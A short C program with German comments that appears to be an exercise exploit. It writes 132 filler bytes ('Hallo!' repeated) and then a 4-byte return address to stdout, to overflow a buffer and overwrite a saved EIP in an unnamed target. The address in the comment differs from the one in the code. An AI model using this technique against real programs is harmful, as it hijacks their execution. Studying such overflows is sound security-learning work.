#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

//Unsere Adresse: 0x08048479 
//Wir brauchen: 132 bytes: 128 + 4 EBP 

int main(int args, char **argv) 
{ 
    int i = 0; 

    for(i = 0; i < 22; i++) 
        printf("Hallo!"); 

    //Bringt die Adresse auf 4 Byte, unsigned 
        unsigned EIP = 0x0000000000400691; // 0x08048479; 
    fwrite(&EIP, 1, 4, stdout); 

    return 0; 
} 
